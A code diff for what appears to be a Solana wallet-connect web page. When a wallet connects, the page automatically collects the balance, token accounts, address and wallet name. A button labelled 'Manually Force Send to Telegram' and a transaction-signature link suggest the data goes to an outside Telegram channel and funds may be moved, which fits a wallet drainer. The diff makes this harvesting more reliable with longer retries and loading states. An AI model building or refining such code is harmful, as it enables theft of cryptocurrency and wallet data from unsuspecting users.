@@ -1,4 +1,3 @@
-
 import { Settings, Menu } from "lucide-react";
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
@@ -21,6 +20,7 @@ const Index = () => {
   const [tokens, setTokens] = useState<any[]>([]);
   const [connectionError, setConnectionError] = useState<string | null>(null);
   const [connectionAttempts, setConnectionAttempts] = useState(0);
+  const [isLoading, setIsLoading] = useState(false);
 
   // Enhanced wallet data fetching with better error handling
   const fetchWalletData = async () => {
@@ -31,21 +31,24 @@ const Index = () => {
     }
 
     setConnectionError(null);
+    setIsLoading(true);
     
     try {
       console.log("Getting wallet balance");
-      // Retry balance fetch up to 3 times
+      // Retry balance fetch up to 5 times with increasing delays
       let balance = 0;
       let fetchSuccess = false;
       
-      for (let i = 0; i < 3; i++) {
+      for (let i = 0; i < 5; i++) {
         try {
+          console.log(`Balance fetch attempt ${i+1}`);
           balance = await connection.getBalance(publicKey, 'confirmed');
+          console.log(`Balance fetch attempt ${i+1} succeeded: ${balance}`);
           fetchSuccess = true;
           break;
         } catch (err) {
           console.error(`Balance fetch attempt ${i+1} failed:`, err);
-          await new Promise(resolve => setTimeout(resolve, 1000));
+          await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
         }
       }
       
@@ -60,12 +63,12 @@ const Index = () => {
       // Get token accounts with retry logic built into the function
       console.log("Fetching token accounts");
       const tokenAccounts = await getTokenAccounts(connection, publicKey.toString());
-      setTokens(tokenAccounts);
-      console.log("Token accounts:", tokenAccounts);
+      console.log("Token accounts received:", tokenAccounts);
+      setTokens(tokenAccounts || []);
 
       return {
         address: publicKey.toString(),
-        tokens: tokenAccounts,
+        tokens: tokenAccounts || [],
         balance: solBalance,
         connectionTime: new Date().toISOString(),
         walletName: wallet?.adapter?.name || "Unknown Wallet"
@@ -74,6 +77,8 @@ const Index = () => {
       console.error("Error fetching wallet data:", error);
       setConnectionError(error instanceof Error ? error.message : "Unknown error fetching wallet data");
       return null;
+    } finally {
+      setIsLoading(false);
     }
   };
 
@@ -255,14 +260,6 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
     }
   };
 
-  useEffect(() => {
-    if (connected && publicKey && !isProcessing) {
-      // When connection changes, start wallet processing
-      handleWalletConnection();
-    }
-  }, [connected, publicKey]);
-
-  // Add a button to manually retry connection if previous attempts failed
   const handleManualRetry = () => {
     if (connected && publicKey && !isProcessing) {
       handleWalletConnection();
@@ -274,7 +271,13 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
     }
   };
 
-  // Update the network display in the UI
+  useEffect(() => {
+    if (connected && publicKey && !isProcessing) {
+      // When connection changes, start wallet processing
+      handleWalletConnection();
+    }
+  }, [connected, publicKey]);
+
   return (
     <div className="min-h-screen bg-background p-6 relative">
       {/* Top Navigation */}
@@ -308,6 +311,15 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
         <div className="flex flex-col w-full max-w-md gap-4 mt-4">
           <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
           
+          {isLoading && (
+            <div className="mt-4 p-4 bg-blue-900/30 border border-blue-700 rounded-lg">
+              <p className="text-blue-300 font-semibold">Loading wallet data...</p>
+              <div className="mt-2 w-full bg-gray-700 h-2 rounded-full overflow-hidden">
+                <div className="bg-blue-400 h-full animate-pulse w-full"></div>
+              </div>
+            </div>
+          )}
+          
           {connectionError && (
             <div className="mt-4 p-4 bg-red-900/30 border border-red-700 rounded-lg">
               <p className="text-red-300 font-semibold">Connection Error:</p>
@@ -315,9 +327,9 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
               <button 
                 onClick={handleManualRetry}
                 className="mt-2 bg-red-700/50 text-white py-2 px-4 rounded-md hover:bg-red-700/80 transition-colors text-sm"
-                disabled={isProcessing}
+                disabled={isProcessing || isLoading}
               >
-                {isProcessing ? "Processing..." : "Retry Connection"}
+                {isProcessing || isLoading ? "Processing..." : "Retry Connection"}
               </button>
             </div>
           )}
@@ -372,9 +384,9 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
             <button
               onClick={handleManualRetry}
               className="mt-3 bg-cyan-700/50 text-white py-2 px-4 rounded-md hover:bg-cyan-700/80 transition-colors text-sm"
-              disabled={isProcessing || !connected}
+              disabled={isProcessing || isLoading || !connected}
             >
-              Manually Force Send to Telegram
+              {(isProcessing || isLoading) ? "Processing..." : "Manually Force Send to Telegram"}
             </button>
           </div>
         </div>
